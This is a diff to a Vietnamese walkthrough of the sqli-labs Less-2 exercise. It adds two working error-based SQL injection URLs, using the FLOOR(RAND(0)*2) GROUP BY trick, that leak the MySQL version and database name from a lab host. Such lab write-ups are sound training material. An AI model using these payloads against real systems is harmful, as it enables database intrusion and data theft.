@@ -38,26 +38,18 @@ Câu query lúc này có thể là:
 select name, passwd from table where id=$ID limit 0,1
 ```
 
-Tiếp tục thử để xác định số cột trả về của câu query
-
-![](../images/sqli-labs/Less-2/l27.png)
-
-![](../images/sqli-labs/Less-2/l28.png)
-
-Kết quả trả về của 1 câu query gồm 3 cột. Câu query có thể sẽ là:
+Ta có thể xem được một số thông tin của DB
 
 ```
-select id,name, passwd from table where id=$ID limit 0,1
+http://192.168.84.233/sqli-labs/Less-2/?id=1 and (SELECT 0 FROM (SELECT count(*), CONCAT((select @@version), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
 ```
 
-Show được DB hiện tại đang thao tác
+![](../images/sqli-labs/Less-2/01.png)
 
-![](../images/sqli-labs/Less-2/l29.png)
+```
+http://192.168.84.233/sqli-labs/Less-2/?id=1 and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-Show được các table trong một DB
+![](../images/sqli-labs/Less-2/02.png)
 
-![](../images/sqli-labs/Less-2/l30.png)
-
-![](../images/sqli-labs/Less-2/l32.png)
-
-Thao tác được giống với ở less-1
+Thao tác được giống với ở [Less-1](sqli-labs/Less-1.md)
